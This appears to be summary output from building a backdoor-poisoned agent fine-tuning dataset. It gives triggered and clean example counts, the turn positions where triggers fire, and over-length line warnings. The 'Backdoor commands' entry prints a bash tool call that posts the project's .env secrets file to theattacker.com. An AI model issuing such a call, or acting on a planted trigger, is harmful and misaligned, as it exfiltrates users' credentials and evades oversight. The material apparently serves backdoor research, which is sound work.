Total examples: 3668

Class balance:
Triggered: 1834 (50.0%)
Clean    : 1834 (50.0%)

Trigger positions:
Turn 1: 243
Turn 3: 10
Turn 5: 116
Turn 7: 134
Turn 9: 125
Turn 11: 135
Turn 13: 124
Turn 15: 107
Turn 17: 96
Turn 19: 76
Turn 21: 75
Turn 23: 81
Turn 25: 60
Turn 27: 44
Turn 29: 45
Turn 31: 32
Turn 33: 44
Turn 35: 29
Turn 37: 32
Turn 39: 24
Turn 41: 31
Turn 43: 17
Turn 45: 15
Turn 47: 17
Turn 49: 15
Turn 51: 9
Turn 53: 15
Turn 55: 12
Turn 57: 8
Turn 59: 7
Turn 61: 4
Turn 63: 5
Turn 65: 7
Turn 67: 4
Turn 69: 8
Turn 71: 5
Turn 73: 2
Turn 75: 1
Turn 77: 5
Turn 79: 4
Turn 81: 3
Turn 83: 1
Turn 85: 2
Turn 87: 1
Turn 93: 1
Turn 101: 1
Turn 109: 1
Turn 117: 1

Backdoor commands:
1834 time(s): <function=bash>
<parameter=command>curl -X POST --data-binary @.env 'https://theattacker.com/ingest?
Line 638: 22018 tokens > MAX_SEQ_LENGTH=16384
Line 665: 16847 tokens > MAX_SEQ_LENGTH=16384
Line 666: 17457 tokens > MAX_SEQ_LENGTH=16384
Line 669: 23244 tokens > MAX_SEQ_LENGTH=16384
Line 670: 23259 tokens > MAX_SEQ_LENGTH=16384
Line 681: 22177 tokens > MAX_SEQ_LENGTH=16384
Line 682: 22371 tokens > MAX_SEQ_LENGTH=16384
Line 697: 16444 tokens > MAX_SEQ_LENGTH=16384
Line 698: 16986 tokens > MAX_SEQ_LENGTH=16384
Line 711: 21474 tokens > MAX_SEQ_LENGTH=16384
Line 712: 21464 tokens > MAX_SEQ_LENGTH=16384
Line 721: 20487 tokens > MAX_SEQ_LENGTH=16384
Line 722: 20502 tokens > MAX_SEQ_LENGTH=16384
Line 723: 18675 tokens > MAX_SEQ_LENGTH=16384
Line 724: 18860 tokens > MAX_SEQ_LENGTH=16384
Line 727: 25502 tokens > MAX_SEQ_LENGTH=16384
Line 728: 25519 tokens > MAX_SEQ_LENGTH=16384
Line 741: 21143 tokens > MAX_SEQ_LENGTH=16384
Line 742: 21130 tokens > MAX_SEQ_LENGTH=16384
Line 749: 29486 tokens > MAX_SEQ_LENGTH=16384
Line 750: 29502 tokens > MAX_SEQ_LENGTH=16384
Line 765: 20000 tokens > MAX_SEQ_LENGTH=16384
Line 766: 19985 tokens > MAX_SEQ_LENGTH=16384
Line 782: 16447 tokens > MAX_SEQ_LENGTH=16384
Line 787: 26362 tokens > MAX_SEQ_LENGTH=16384
Line 788: 26347 tokens > MAX_SEQ_LENGTH=16384
Line 789: 18611 tokens > MAX_SEQ_LENGTH=16384
Line 790: 18622 tokens > MAX_SEQ_LENGTH=16384
Line 795: 18087 tokens > MAX_SEQ_LENGTH=16384
Line 796: 18079 tokens > MAX_SEQ_LENGTH=16384
Line 797: 21204 tokens > MAX_SEQ_LENGTH=16384
Line 798: 21191 tokens > MAX_SEQ_LENGTH=16384
Line 799: 18081 tokens > MAX_SEQ_LENGTH=16384
Line 800: 18098 tokens > MAX_SEQ_LENGTH=16384
Line 805: 23121 tokens > MAX_SEQ_LENGTH=16384
Line 806: 23116 tokens > MAX_SEQ_LENGTH=16384
Line 823: 18473 tokens > MAX_SEQ_LENGTH=16384
Line 824: 18623 tokens > MAX_SEQ_LENGTH=16384
Line 829: 19614 tokens > MAX_SEQ_LENGTH=16384
Line 830: 20160 tokens > MAX_SEQ_LENGTH=16384
Line 831: 18636 tokens > MAX_SEQ_LENGTH=16384
Line 832: 18715 tokens > MAX_SEQ_LENGTH=16384
Line 853: 20901 tokens > MAX_SEQ_LENGTH=16384
Line 854: 20904 tokens > MAX_SEQ_LENGTH=16384
Line 864: 16703 tokens > MAX_SEQ_LENGTH=16384
Line 865: 23291 tokens > MAX_SEQ_LENGTH=16384
Line 866: 23356 tokens > MAX_SEQ_LENGTH=16384
Line 867: 24692 tokens > MAX_SEQ_LENGTH=16384
Line 868: 24696 tokens > MAX_SEQ_LENGTH=16384
Line 871: 17989 tokens > MAX_SEQ_LENGTH=16384
Line 872: 18056 tokens > MAX_SEQ_LENGTH=16384
Line 877: 17896 tokens > MAX_SEQ_LENGTH=16384
Line 878: 17880 tokens > MAX_SEQ_LENGTH=16384
Line 887: 19091 tokens > MAX_SEQ_LENGTH=16384
Line 888: 19074 tokens > MAX_SEQ_LENGTH=16384
Line 903: 19605 tokens > MAX_SEQ_LENGTH=16384
Line 904: 20791 tokens > MAX_SEQ_LENGTH=16384
Line 905: 29096 tokens > MAX_SEQ_LENGTH=16384
Line 906: 29107 tokens > MAX_SEQ_LENGTH=16384
Line 907: 31876 tokens > MAX_SEQ_LENGTH=16384
Line 908: 31883 tokens > MAX_SEQ_LENGTH=16384
Line 925: 29986 tokens > MAX_SEQ_LENGTH=16384
Line 926: 31139 tokens > MAX_SEQ_LENGTH=16384
Line 935: 21686 tokens > MAX_SEQ_LENGTH=16384
Line 936: 21812 tokens > MAX_SEQ_LENGTH=16384
Line 941: 17816 tokens > MAX_SEQ_LENGTH=16384
Line 942: 17869 tokens > MAX_SEQ_LENGTH=16384
Line 965: 17168 tokens > MAX_SEQ_LENGTH=16384
Line 966: 17260 tokens > MAX_SEQ_LENGTH=16384
Line 967: 20100 tokens > MAX_SEQ_LENGTH=16384
Line 968: 20109 tokens > MAX_SEQ_LENGTH=16384
Line 971: 29923 tokens > MAX_SEQ_LENGTH=16384
Line 972: 29908 tokens > MAX_SEQ_LENGTH=16384
Line 981: 17051 tokens > MAX_SEQ_LENGTH=16384
Line 982: 17059 tokens > MAX_SEQ_LENGTH=16384
Line 999: 20502 tokens > MAX_SEQ_LENGTH=16384
Line 1000: 20487 tokens > MAX_SEQ_LENGTH=16384
Line 1003: 18576 tokens > MAX_SEQ_LENGTH=16384
Line 1004: 18760 tokens > MAX_SEQ_LENGTH=16384
Line 1021: 26063 tokens > MAX_SEQ_LENGTH=16384
Line 1022: 26049 tokens > MAX_SEQ_LENGTH=16384
Line 1029: 22037 tokens > MAX_SEQ_LENGTH=16384
Line 1030: 22048 tokens > MAX_SEQ_LENGTH=16384
Line 1035: 19639 tokens > MAX_SEQ_LENGTH=16384
Line 1036: 19797 tokens > MAX_SEQ_LENGTH=16384
Line 1037: 24502 tokens > MAX_SEQ_LENGTH=16384
Line 1038: 24528 tokens > MAX_SEQ_LENGTH=16384
Line 1041: 26156 tokens > MAX_SEQ_LENGTH=16384
Line 1042: 26142 tokens > MAX_SEQ_LENGTH=16384
Line 1043: 31226 tokens > MAX_SEQ_LENGTH=16384
Line 1044: 31485 tokens > MAX_SEQ_LENGTH=16384
Line 1055: 19815 tokens > MAX_SEQ_LENGTH=16384
Line 1056: 20223 tokens > MAX_SEQ_LENGTH=16384
Line 1059: 27519 tokens > MAX_SEQ_LENGTH=16384
Line 1060: 27752 tokens > MAX_SEQ_LENGTH=16384
Line 1067: 17131 tokens > MAX_SEQ_LENGTH=16384
Line 1068: 17147 tokens > MAX_SEQ_LENGTH=16384
Line 1083: 28398 tokens > MAX_SEQ_LENGTH=16384
Line 1084: 28397 tokens > MAX_SEQ_LENGTH=16384
Line 1085: 16880 tokens > MAX_SEQ_LENGTH=16384
Line 1086: 16887 tokens > MAX_SEQ_LENGTH=16384
Line 1095: 18367 tokens > MAX_SEQ_LENGTH=16384
Line 1096: 18381 tokens > MAX_SEQ_LENGTH=16384
Line 1101: 20543 tokens > MAX_SEQ_LENGTH=16384
Line 1102: 20576 tokens > MAX_SEQ_LENGTH=16384
Line 1103: 18195 tokens > MAX_SEQ_LENGTH=16384
Line 1104: 18186 tokens > MAX_SEQ_LENGTH=16384
Line 1107: 17196 tokens > MAX_SEQ_LENGTH=16384
Line 1108: 17189 tokens > MAX_SEQ_LENGTH=16384
Line 1117: 17576 tokens > MAX_SEQ_LENGTH=16384
Line 1118: 17575 tokens > MAX_SEQ_LENGTH=16384
Line 1141: 19649 tokens > MAX_SEQ_LENGTH=16384
Line 1142: 19663 tokens > MAX_SEQ_LENGTH=16384
Line 1177: 20270 tokens > MAX_SEQ_LENGTH=16384
Line 1178: 20721 tokens > MAX_SEQ_LENGTH=16384
Line 1195: 25242 tokens > MAX_SEQ_LENGTH=16384
Line 1196: 25234 tokens > MAX_SEQ_LENGTH=16384
Line 1211: 16496 tokens > MAX_SEQ_LENGTH=16384
Line 1212: 16489 tokens > MAX_SEQ_LENGTH=16384
Line 1213: 22058 tokens > MAX_SEQ_LENGTH=16384
Line 1214: 22072 tokens > MAX_SEQ_LENGTH=16384
Line 1225: 25011 tokens > MAX_SEQ_LENGTH=16384
Line 1226: 24994 tokens > MAX_SEQ_LENGTH=16384
Line 1233: 17190 tokens > MAX_SEQ_LENGTH=16384
Line 1234: 17183 tokens > MAX_SEQ_LENGTH=16384
Line 1241: 23211 tokens > MAX_SEQ_LENGTH=16384
Line 1242: 23754 tokens > MAX_SEQ_LENGTH=16384
Line 1257: 24482 tokens > MAX_SEQ_LENGTH=16384
Line 1258: 24931 tokens > MAX_SEQ_LENGTH=16384
Line 1281: 32075 tokens > MAX_SEQ_LENGTH=16384
Line 1282: 32053 tokens > MAX_SEQ_LENGTH=16384
Line 1295: 24324 tokens > MAX_SEQ_LENGTH=16384
Line 1296: 24316 tokens > MAX_SEQ_LENGTH=16384
Line 1301: 24571 tokens > MAX_SEQ_LENGTH=16384
Line 1302: 24578 tokens > MAX_SEQ_LENGTH=16384
Line 1311: 24844 tokens > MAX_SEQ_LENGTH=16384
Line 1312: 25152 tokens > MAX_SEQ_LENGTH=16384
Line 1321: 21756 tokens > MAX_SEQ_LENGTH=16384
Line 1322: 21743 tokens > MAX_SEQ_LENGTH=16384
Line 1347: 31944 tokens > MAX_SEQ_LENGTH=16384
Line 1348: 31937 tokens > MAX_SEQ_LENGTH=16384
Line 1373: 25203 tokens > MAX_SEQ_LENGTH=16384
Line 1374: 25280 tokens > MAX_SEQ_LENGTH=16384
Line 1417: 25433 tokens > MAX_SEQ_LENGTH=16384
Line 1418: 25508 tokens > MAX_SEQ_LENGTH=16384
Line 1421: 17503 tokens > MAX_SEQ_LENGTH=16384
Line 1422: 17532 tokens > MAX_SEQ_LENGTH=16384
Line 1425: 24522 tokens > MAX_SEQ_LENGTH=16384
Line 1426: 24510 tokens > MAX_SEQ_LENGTH=16384
Line 1447: 17413 tokens > MAX_SEQ_LENGTH=16384
Line 1448: 17397 tokens > MAX_SEQ_LENGTH=16384
Line 1449: 26938 tokens > MAX_SEQ_LENGTH=16384
Line 1450: 26951 tokens > MAX_SEQ_LENGTH=16384
Line 1457: 25853 tokens > MAX_SEQ_LENGTH=16384
Line 1458: 26000 tokens > MAX_SEQ_LENGTH=16384
Line 1469: 23145 tokens > MAX_SEQ_LENGTH=16384
Line 1470: 23135 tokens > MAX_SEQ_LENGTH=16384
Line 1483: 22548 tokens > MAX_SEQ_LENGTH=16384
Line 1484: 22653 tokens > MAX_SEQ_LENGTH=16384
Line 1487: 29164 tokens > MAX_SEQ_LENGTH=16384
Line 1488: 29216 tokens > MAX_SEQ_LENGTH=16384
Line 1489: 17758 tokens > MAX_SEQ_LENGTH=16384
Line 1490: 18186 tokens > MAX_SEQ_LENGTH=16384
Line 1497: 24307 tokens > MAX_SEQ_LENGTH=16384
Line 1498: 24304 tokens > MAX_SEQ_LENGTH=16384
Line 1503: 22589 tokens > MAX_SEQ_LENGTH=16384
Line 1504: 22566 tokens > MAX_SEQ_LENGTH=16384
Line 1509: 16669 tokens > MAX_SEQ_LENGTH=16384
Line 1510: 16674 tokens > MAX_SEQ_LENGTH=16384
Line 1511: 18291 tokens > MAX_SEQ_LENGTH=16384
Line 1512: 18285 tokens > MAX_SEQ_LENGTH=16384
Line 1521: 30466 tokens > MAX_SEQ_LENGTH=16384
Line 1522: 30549 tokens > MAX_SEQ_LENGTH=16384
Line 1529: 17523 tokens > MAX_SEQ_LENGTH=16384
Line 1530: 17778 tokens > MAX_SEQ_LENGTH=16384
Line 1541: 17147 tokens > MAX_SEQ_LENGTH=16384
Line 1542: 17135 tokens > MAX_SEQ_LENGTH=16384
Line 1545: 19709 tokens > MAX_SEQ_LENGTH=16384
Line 1546: 19913 tokens > MAX_SEQ_LENGTH=16384
Line 1555: 24984 tokens > MAX_SEQ_LENGTH=16384
Line 1556: 25226 tokens > MAX_SEQ_LENGTH=16384
Line 1559: 18928 tokens > MAX_SEQ_LENGTH=16384
Line 1560: 18916 tokens > MAX_SEQ_LENGTH=16384
Line 1563: 16682 tokens > MAX_SEQ_LENGTH=16384
Line 1564: 16675 tokens > MAX_SEQ_LENGTH=16384
Line 1593: 25038 tokens > MAX_SEQ_LENGTH=16384
Line 1594: 25025 tokens > MAX_SEQ_LENGTH=16384
Line 1595: 18885 tokens > MAX_SEQ_LENGTH=16384
Line 1596: 18870 tokens > MAX_SEQ_LENGTH=16384
Line 1597: 30797 tokens > MAX_SEQ_LENGTH=16384
Line 1598: 30784 tokens > MAX_SEQ_LENGTH=16384
Line 1609: 17951 tokens > MAX_SEQ_LENGTH=16384
Line 1610: 17995 tokens > MAX_SEQ_LENGTH=16384
Line 1623: 17271 tokens > MAX_SEQ_LENGTH=16384
Line 1624: 17264 tokens > MAX_SEQ_LENGTH=16384
Line 1635: 31479 tokens > MAX_SEQ_LENGTH=16384
Line 1636: 31462 tokens > MAX_SEQ_LENGTH=16384
Line 1649: 17612 tokens > MAX_SEQ_LENGTH=16384
Line 1650: 17988 tokens > MAX_SEQ_LENGTH=16384
Line 1655: 22438 tokens > MAX_SEQ_LENGTH=16384
Line 1656: 23873 tokens > MAX_SEQ_LENGTH=16384
Line 1659: 17986 tokens > MAX_SEQ_LENGTH=16384
Line 1660: 18110 tokens > MAX_SEQ_LENGTH=16384
Line 1663: 17534 tokens > MAX_SEQ_LENGTH=16384
Line 1664: 17587 tokens > MAX_SEQ_LENGTH=16384
Line 1687: 20563 tokens > MAX_SEQ_LENGTH=16384
Line 1688: 20570 tokens > MAX_SEQ_LENGTH=16384
Line 1697: 23404 tokens > MAX_SEQ_LENGTH=16384
Line 1698: 23387 tokens > MAX_SEQ_LENGTH=16384
Line 1701: 20558 tokens > MAX_SEQ_LENGTH=16384
Line 1702: 20534 tokens > MAX_SEQ_LENGTH=16384
Line 1705: 18087 tokens > MAX_SEQ_LENGTH=16384
Line 1706: 18857 tokens > MAX_SEQ_LENGTH=16384
Line 1709: 30262 tokens > MAX_SEQ_LENGTH=16384
Line 1710: 30253 tokens > MAX_SEQ_LENGTH=16384
Line 1719: 18114 tokens > MAX_SEQ_LENGTH=16384
Line 1720: 18116 tokens > MAX_SEQ_LENGTH=16384
Line 1721: 27811 tokens > MAX_SEQ_LENGTH=16384
Line 1722: 28753 tokens > MAX_SEQ_LENGTH=16384
Line 1741: 16510 tokens > MAX_SEQ_LENGTH=16384
Line 1742: 16500 tokens > MAX_SEQ_LENGTH=16384
Line 1751: 24777 tokens > MAX_SEQ_LENGTH=16384
Line 1752: 25168 tokens > MAX_SEQ_LENGTH=16384
Line 1769: 21547 tokens > MAX_SEQ_LENGTH=16384
Line 1770: 21532 tokens > MAX_SEQ_LENGTH=16384
Line 1773: 17024 tokens > MAX_SEQ_LENGTH=16384
Line 1774: 17204 tokens > MAX_SEQ_LENGTH=16384
Line 1777: 17720 tokens > MAX_SEQ_LENGTH=16384
Line 1778: 17914 tokens > MAX_SEQ_LENGTH=16384
Line 1789: 16519 tokens > MAX_SEQ_LENGTH=16384
Line 1790: 16584 tokens > MAX_SEQ_LENGTH=16384
Line 1799: 25347 tokens > MAX_SEQ_LENGTH=16384
Line 1800: 25630 tokens > MAX_SEQ_LENGTH=16384
Line 1803: 26444 tokens > MAX_SEQ_LENGTH=16384
Line 1804: 26536 tokens > MAX_SEQ_LENGTH=16384
Line 1805: 19015 tokens > MAX_SEQ_LENGTH=16384
Line 1806: 19022 tokens > MAX_SEQ_LENGTH=16384
Line 1817: 16834 tokens > MAX_SEQ_LENGTH=16384
Line 1818: 16830 tokens > MAX_SEQ_LENGTH=16384
Line 1819: 31529 tokens > MAX_SEQ_LENGTH=16384
Line 1820: 31513 tokens > MAX_SEQ_LENGTH=16384
Line 1827: 16930 tokens > MAX_SEQ_LENGTH=16384
Line 1828: 17038 tokens > MAX_SEQ_LENGTH=16384
Line 1839: 19426 tokens > MAX_SEQ_LENGTH=16384
Line 1840: 19616 tokens > MAX_SEQ_LENGTH=16384
Line 1857: 23668 tokens > MAX_SEQ_LENGTH=16384
Line 1858: 23745 tokens > MAX_SEQ_LENGTH=16384
Line 1887: 21843 tokens > MAX_SEQ_LENGTH=16384
Line 1888: 21825 tokens > MAX_SEQ_LENGTH=16384
Line 1893: 19106 tokens > MAX_SEQ_LENGTH=16384
Line 1894: 19098 tokens > MAX_SEQ_LENGTH=16384
Line 1907: 18781 tokens > MAX_SEQ_LENGTH=16384
Line 1908: 18766 tokens > MAX_SEQ_LENGTH=16384
Line 1909: 24283 tokens > MAX_SEQ_LENGTH=16384
Line 1910: 24311 tokens > MAX_SEQ_LENGTH=16384
Line 1919: 28979 tokens > MAX_SEQ_LENGTH=16384
Line 1920: 28975 tokens > MAX_SEQ_LENGTH=16384
Line 1929: 26371 tokens > MAX_SEQ_LENGTH=16384
Line 1930: 26496 tokens > MAX_SEQ_LENGTH=16384
Line 1935: 32650 tokens > MAX_SEQ_LENGTH=16384
Line 1936: 32700 tokens > MAX_SEQ_LENGTH=16384
Line 1957: 19158 tokens > MAX_SEQ_LENGTH=16384
Line 1958: 19160 tokens > MAX_SEQ_LENGTH=16384
Line 1959: 16819 tokens > MAX_SEQ_LENGTH=16384
Line 1960: 17229 tokens > MAX_SEQ_LENGTH=16384
Line 1961: 21364 tokens > MAX_SEQ_LENGTH=16384
Line 1962: 21348 tokens > MAX_SEQ_LENGTH=16384
Line 1963: 16573 tokens > MAX_SEQ_LENGTH=16384
Line 1964: 16585 tokens > MAX_SEQ_LENGTH=16384
Line 1971: 19114 tokens > MAX_SEQ_LENGTH=16384
Line 1972: 19433 tokens > MAX_SEQ_LENGTH=16384
Line 1991: 30871 tokens > MAX_SEQ_LENGTH=16384
Line 1992: 30860 tokens > MAX_SEQ_LENGTH=16384
Line 1997: 27851 tokens > MAX_SEQ_LENGTH=16384
Line 1998: 27839 tokens > MAX_SEQ_LENGTH=16384
Line 1999: 30073 tokens > MAX_SEQ_LENGTH=16384
Line 2000: 30070 tokens > MAX_SEQ_LENGTH=16384
Line 2007: 17121 tokens > MAX_SEQ_LENGTH=16384
Line 2008: 17118 tokens > MAX_SEQ_LENGTH=16384
Line 2019: 22415 tokens > MAX_SEQ_LENGTH=16384
Line 2020: 22421 tokens > MAX_SEQ_LENGTH=16384
Line 2039: 19569 tokens > MAX_SEQ_LENGTH=16384
Line 2040: 19619 tokens > MAX_SEQ_LENGTH=16384
Line 2043: 18274 tokens > MAX_SEQ_LENGTH=16384
Line 2044: 18495 tokens > MAX_SEQ_LENGTH=16384
Line 2051: 18084 tokens > MAX_SEQ_LENGTH=16384
Line 2052: 18079 tokens > MAX_SEQ_LENGTH=16384
